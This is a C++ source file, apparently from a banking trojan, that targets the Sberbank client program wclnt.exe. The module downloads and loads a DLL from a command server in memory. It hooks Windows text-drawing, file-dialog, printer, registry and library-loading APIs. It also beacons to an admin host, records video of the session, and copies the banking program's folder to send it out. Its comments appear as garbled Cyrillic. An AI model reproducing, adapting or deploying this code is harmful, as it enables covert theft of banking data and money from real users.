#include <windows.h>
#include <windowsx.h>
#include "GetApi.h"
#include "Utils.h"
#include "Memory.h"
#include "Strings.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Splice.h"
#include "Config.h"
#include "Crypt.h"
#include "Sber.h"
#include "Plugins.h"
#include "DllLoader.h"
#include "VideoRecorder.h"
#include "Inject.h"
#include "BotCore.h"

#include "CabPacker.h"
#include "Loader.h"
#include "BotHTTP.h"

#include "BotDebug.h"

namespace SBER_DOWNLOAD_DLL
{
    #include "DbgTemplates.h"
}
#define DBG SBER_DOWNLOAD_DLL::DBGOutMessage<>

static char SBER_HOSTS[SBERHOSTS_PARAM_SIZE] = SBERHOSTS_PARAM_NAME;

namespace Sber
{

// ������ �� Sb.dll
typedef BOOL( WINAPI *PInitFunc )		(DWORD origFunc, char *funcName);
typedef VOID( WINAPI *PSetParams )		(char *AHost, char *AUid);
typedef BOOL( WINAPI *PShowWindow )		( HWND hWnd, int nCmdShow );
typedef BOOL( WINAPI *PTranslateMessage )( const MSG *lpMsg );
typedef BOOL( WINAPI *PTextOutA )		(HDC hdc, int x, int y, LPCSTR lpString, int c);
typedef BOOL ( WINAPI *PTextOutW )( HDC hdc, int x, int y, LPCWSTR lpString, int c);

typedef int ( WINAPI *PDrawTextA )(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);

typedef int ( WINAPI *PDrawTextW )(HDC hdc, LPCWSTR lpchText, int cchText, LPRECT lprc, UINT format);

typedef int ( WINAPI *PDrawTextExA )(HDC hdc, LPSTR lpchText, int cchText, LPRECT lprc, UINT format,
																		LPDRAWTEXTPARAMS lpdtp);

typedef int ( WINAPI *PDrawTextExW )(HDC hdc, LPWSTR lpchText, int cchText, LPRECT lprc, UINT format,
																		LPDRAWTEXTPARAMS lpdtp);

typedef BOOL ( WINAPI *PExtTextOutA )(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
																			LPCSTR lpString, UINT c, CONST INT * lpDx);
typedef BOOL ( WINAPI *PExtTextOutW )(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
																			LPCWSTR lpString, UINT c, CONST INT * lpDx);

typedef BOOL ( WINAPI *PEnumPrintersA)(DWORD Flags, LPSTR Name, DWORD Level, LPBYTE  pPrinterEnum,
																			DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned);

typedef BOOL  ( WINAPI *PGetSaveFileNameA )(LPOPENFILENAME lpofn);
typedef BOOL  ( WINAPI *PGetOpenFileNameA )(LPOPENFILENAME lpofn);

typedef HMODULE ( WINAPI *PLoadLibraryExW )(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags );
typedef LSTATUS ( WINAPI *PRegQueryValueExA )(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved,
									LPDWORD lpType,  LPBYTE lpData, LPDWORD lpcbData);

// ������ ������ ������������� �������
static PShowWindow Real_ShowWindow;
static PTranslateMessage Real_TranslateMessage;
static PTextOutA Real_TextOutA;
static PTextOutW Real_TextOutW;
static PDrawTextA Real_DrawTextA;
static PDrawTextW Real_DrawTextW;
static PExtTextOutA Real_ExtTextOutA;
static PExtTextOutW Real_ExtTextOutW;
static PDrawTextExA Real_DrawTextExA;
static PDrawTextExW Real_DrawTextExW;
static PEnumPrintersA Real_EnumPrintersA;
static PGetSaveFileNameA Real_GetSaveFileNameA;
static PGetOpenFileNameA Real_GetOpenFileNameA;
static PLoadLibraryExW Real_LoadLibraryExW;
static PRegQueryValueExA Real_RegQueryValueExA;

char domain[128]; //����� �������
char botUid[128];

//������� ��� ����� ��� �������� dll � �����
static PCHAR GetNameDll(char* uid)
{
	PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
	if( path )
	{
		pGetTempPathA( MAX_PATH, path );
		pPathAppendA( path, uid );
		char* path2 = UIDCrypt::CryptFileName( path, true );
		DBG( "Sber", "��� ����� dll: %s", path2 );
		HEAP::Free(path);
		path = path2;
	}
	return path;
}

static char* GetAdminUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, "bifit-dbo.ru" );
#else
	string host = GetActiveHostFromBuf2( SBER_HOSTS, 0x15D1BD02 /* __SBER_HOSTS__ */, SBERHOSTS_PARAM_ENCRYPTED );
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

static void SendLogToAdmin( int num )
{
	char qr[128];
	fwsprintfA pwsprintfA = Get_wsprintfA();
	pwsprintfA( qr, "http://%s/set/bit.html?uid=%s&sum=%d&type=cber&mode=stat", domain, BOT_UID, num );
	THTTPResponse Response;
	ClearStruct(Response);
	HTTP::Get( qr, 0, &Response );
	DBG( "Sber", "������� ����: %s", qr );
	HTTPResponse::Clear(&Response);
}

static BYTE* LoadSluiceDll( char* uid )
{
	char url[128];
	fwsprintfA pwsprintfA = Get_wsprintfA();
	pwsprintfA( url, "http://%s/s.dll", domain );

	BYTE* module = 0;
	char* nameFile = GetNameDll(uid);
	//��������� ������ �� ����
	char psw[9];
	m_memcpy( psw, uid, 8 );
	psw[8] = 0;

	if(!HTTP::Get( url, (char**)&module, 0 ))
	{
		DBG( "Sber", "�� �������� ������� ������ ���, ��������� ���� �� ��� �� ������ %s", url );
		if( nameFile )
		{
			DWORD sz;
			char* data = (char*)File::ReadToBufferA( nameFile, sz );
			if( RC2Crypt::Decode( psw, data, sz ) )
				module = (BYTE*)data;
			else
			{
				MemFree(data);
				module = 0;
			}
		}
		else
			return 0;
	}
	else
	{
		int szModule = STR::Length((char*)module);
		DBG( "Sber", "�������� ���� %s, ������: %d", url, szModule );
		if( nameFile )
		{
			char* data = RC2Crypt::Encode( module, szModule, psw );
			File::WriteBufferA( nameFile, data, szModule );
			STR::Free(data);
		}
	}
	return module;
}

static bool TranslateHook( HMEMORYMODULE dll, PInitFunc InitFunc, const char* nameDllFunc, const char* nameHookFunc, int numHookDll, DWORD hashHookFunc, void* realFunc )
{
	void* addrFunc = MemoryGetProcAddress( dll, nameDllFunc );
	if( !addrFunc )
	{
		DBG( "Sber", "� dll ��� ������� %s", nameDllFunc );
		return false;
	}
	if( HookApi( numHookDll, hashHookFunc, addrFunc, &realFunc ) )
	{  
		if( InitFunc( (DWORD)realFunc, (char*)nameHookFunc ) )
			DBG( "Sber", "��������� ��� �� ��� �� %s", nameHookFunc );
		else
			return false;
	}	
	else
		return false;
	return true;
}

static bool HookSberApi()
{
	DBG( "Sber", "UID: %s", BOT_UID );

	BYTE* BotModule = LoadSluiceDll(BOT_UID);
	if( BotModule == 0 ) return false;
	SendLogToAdmin(2);
	
	HMEMORYMODULE hLib = MemoryLoadLibrary(BotModule);
	if( hLib == NULL )
	{	
		DBG( "Sber", "�� ���������� ��������� ���������� (MemoryLoadLibrary)" );
		return false;
	}
	DBG( "Sber", "���������� ���������" );

	char StartInitFunc_func[] = {'I','n','i','t','F','u','n','c',0};

	PInitFunc pInitFunc = (PInitFunc)MemoryGetProcAddress( hLib, StartInitFunc_func );
	if( pInitFunc == NULL )
	{	
		DBG( "Sber","� dll ��� ������� s%", StartInitFunc_func );
		return 0;
	}

	PSetParams SetParamsSBR = (PSetParams)MemoryGetProcAddress( hLib, "SetParams" );
	if( SetParamsSBR == NULL )
	{
		DBG( "Sber", "� dll ��� ������� s%", StartInitFunc_func );
		return 0;		
	}
	
	char HostOfBots[128];
	const char http[] = {'h','t','t','p',':','/','/', 0};
	m_lstrcpy( HostOfBots, http );
	m_lstrcat( HostOfBots, domain );
	SetParamsSBR( HostOfBots, BOT_UID );
	DBG( "Sber", "�������� ���� %s � UID %s", HostOfBots, BOT_UID );

	//���������� �� ��� ���� � �������������
	TranslateHook( hLib, pInitFunc, "ShowWindowCallBack", "ShowWindow", 3, 0x7506E960, Real_ShowWindow );
	TranslateHook( hLib, pInitFunc, "TranslateMessageCallBack", "TranslateMessage", 3, 0xC45D9631, Real_TranslateMessage );
	TranslateHook( hLib, pInitFunc, "DrawTextACallBack", "DrawTextA", 3, 0x85BBDFC, Real_DrawTextA );
	TranslateHook( hLib, pInitFunc, "DrawTextWCallBack", "DrawTextW", 3, 0x85BBDEA, Real_DrawTextW );
	TranslateHook( hLib, pInitFunc, "DrawTextExACallBack", "DrawTextExA", 3, 0xEF7E3E57, Real_DrawTextExA );
	TranslateHook( hLib, pInitFunc, "DrawTextExWCallBack", "DrawTextExW", 3, 0xEF7E3E41, Real_DrawTextExW );
	TranslateHook( hLib, pInitFunc, "TextOutACallBack", "TextOutA", DLL_GDI, 0x4954ED86, Real_TextOutA );
	TranslateHook( hLib, pInitFunc, "TextOutWCallBack", "TextOutW", DLL_GDI, 0x4954ED90, Real_TextOutW );
	TranslateHook( hLib, pInitFunc, "ExtTextOutACallBack", "ExtTextOutA", DLL_GDI, 0x3D54FCFA, Real_ExtTextOutA );
	TranslateHook( hLib, pInitFunc, "ExtTextOutWCallBack", "ExtTextOutW", DLL_GDI, 0x3D54FCEC, Real_ExtTextOutW );
	TranslateHook( hLib, pInitFunc, "EnumPrintersACallBack", "EnumPrintersA", DLL_WINSPOOL, 0x9804C3C0, Real_EnumPrintersA );
	TranslateHook( hLib, pInitFunc, "GetSaveFileNameACallBack", "GetSaveFileNameA", DLL_COMANDLG32, 0x8FD473C8, Real_GetSaveFileNameA );
	TranslateHook( hLib, pInitFunc, "GetOpenFileNameACallBack", "GetOpenFileNameA", DLL_COMANDLG32, 0xE16570D, Real_GetOpenFileNameA );
	TranslateHook( hLib, pInitFunc, "LoadLibraryExWCallBack", "LoadLibraryExW", 1, 0x20088E7C, Real_LoadLibraryExW );
	TranslateHook( hLib, pInitFunc, "RegQueryValueExACallBack", "RegQueryValueExA", 2, 0x1802E7C8, Real_RegQueryValueExA );

	DBG( "Sber", "��������� ����� ���������" );
	SendLogToAdmin(3);

	StartRecordThread( GetUniquePID(), "Sber", NULL, NULL, 700 );

	char path[MAX_PATH];
	pExpandEnvironmentStringsA( "%USERPROFILE%", path, sizeof(path) );
	pPathAppendA( path, "Local Settings\\Application Data\\Sbr\\Sbr\\sbgrbd.bal" );
	if( FileExistsA(path) )
	{
		DBG( "Sber", "���� '%s' ����������", path );
	}
	else
	{
		DBG( "Sber", "���� '%s' �� ����������", path );
		pPathRemoveFileSpecA(path);
		pPathAppendA( path, "sb.bal" );
		DBG( "Sber", "������� ���� '%s'", path );
		File::WriteBufferA( path, path, 0 );
	}
	return true;
}

//���������������� ����������� ����� �����, ������� �������� �� ��������� �����, � ����� �������� �� ������ � ��������� �����
static DWORD WINAPI CopyFolderThread( LPVOID lpData )
{
	BOT::Initialize();
	// ��� �������� ������ ����� �������� ����� ����
    SetBankingMode();


	char folderTmp[MAX_PATH], pathFlag[MAX_PATH], pathForExe[MAX_PATH];
	if( GetAllUsersProfile( folderTmp, sizeof(folderTmp), "sbe" ) && //���� � ��������� �����
		GetAllUsersProfile( pathForExe, sizeof(pathForExe), "sbe.dat" ) &&
		GetAllUsersProfile( pathFlag, sizeof(pathFlag), "sbef.dat" ) )
	{
		char flag = 0;
		File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //������� ��� ���� ������� �����������
		DWORD sz = 0;
		//���� � exe �����
		char* folderPrg = (char*)File::ReadToBufferA( pathForExe, sz );
		if( folderPrg )
		{
			pPathRemoveFileSpecA(folderPrg); //��������� ������ �����
			*((int*)&(folderPrg[ m_lstrlen(folderPrg) ])) = 0; //��������� 2-� ����, ����� ������ ����������� "\0\0"
			*((int*)&(folderTmp[ m_lstrlen(folderTmp) ])) = 0; 
			//���� �����, ���� ����� �������� ��������� ����� �����, ����, �� ������� ��
			if( Directory::IsExists(folderTmp) ) DeleteFolders(folderTmp);
			pCreateDirectoryA( folderTmp, 0 );
			DBG( "SBER", "����������� �� ��������� ����� %s", folderTmp );
			if( CopyFileANdFolder( folderPrg, folderTmp ) )
			{
				DBG( "SBER", "����������� �� ������" );
				StartSendThread( folderTmp, 0 /*"192.168.0.100"*/, NULL, 700 );
				DeleteFolders(folderTmp);
			}
			flag = 1;
			File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //������� ��� ������� ����������� �������
			MemFree(folderPrg);
			pDeleteFileA(pathForExe);
			DBG( "SBER", "����������� ���������" );
		}
	}
	return 0;
}

//������ svchost.exe ��� ����������� ����� ���������,
//appName - ���� � exe ��������� (wclnt.exe),
//force - true, ���� ����� ���������� ��������� �����������, false - ���� ����������� ��� ����, �� �������� �� ����� ����������
static void StartCopyFolder( const char* appName, bool force )
{
	char pathForExe[MAX_PATH], pathFlag[MAX_PATH];
	if( GetAllUsersProfile( pathForExe, sizeof(pathForExe), "sbe.dat" ) &&
		GetAllUsersProfile( pathFlag, sizeof(pathFlag), "sbef.dat" ) )
	{
		bool run = true;
		if( File::IsExists(pathFlag) )
		{
			DWORD sz;
			char* data = (char*)File::ReadToBufferA( pathFlag, sz );
			if( data[1] == 0 ) //���� �����������
				run = false;
			else //��� ���� �����������
				if( !force ) //��������� ����������� �� �����
					run = false;
			MemFree(data);
		}
		if( run )
		{
			DBG( "SBER", "������ ����������� �����" );
			//��������� ���� � exe ������������ �������� ����� ���������� ����� ���������
			File::WriteBufferA( pathForExe, (void*)appName, m_lstrlen(appName) ); 
			MegaJump(CopyFolderThread);
		}
		else
			DBG( "SBER", "��� ���� �����������, �������� �� �����" );
	}
}

//������ ����������� �� ������ ���������
static void CopyFolderForVersion( const char* appName )
{
	int size = (int)pGetFileVersionInfoSizeA( appName, 0 );
	if( size > 0 )
	{
		char* data = (char*)MemAlloc(size);
		pGetFileVersionInfoA( appName, 0, size, data );
		WORD* lang;
		pVerQueryValueA( data, "\\VarFileInfo\\Translation", (void**)&lang, &size );
		if( size > 0 )
		{
			fwsprintfA pwsprintfA = Get_wsprintfA();
			char keyVer[128], *valVer;
			pwsprintfA( keyVer, "\\StringFileInfo\\%04x%04x\\FileVersion", (int)lang[0], (int)lang[1] );
			pVerQueryValueA( data, keyVer, (void**)&valVer, &size );
			if( size > 0 )
			{
				DBG( "SBER", "������ ��������� %s", valVer );
				if( m_memcmp( valVer, "7.17", 4 ) == 0 ) //"7.12.5.2225" ) == 0 ) 
				{
					StartCopyFolder( appName, false );
				}
			}
		}
		MemFree(data);
	}
}

//�������������� ���������� ���������� 
static bool InitData()
{
	if( GetAdminUrl(domain) == 0 ) return false;
	return true;
}

bool Init( const char* appName, DWORD appHash )
{
	if ( appHash == 0x321ecf12 /*wclnt.exe*/ )
	{
		if( InitData() ) 
		{
			SendLogToAdmin(1);
			UnhookSber();
			HookSberApi();
			CopyFolderForVersion(appName);
			return true;
		}
	}
	return false;
}

bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	StartCopyFolder( "d:\\clnt590\\wclnt.exe", true );
	return 0;
}

};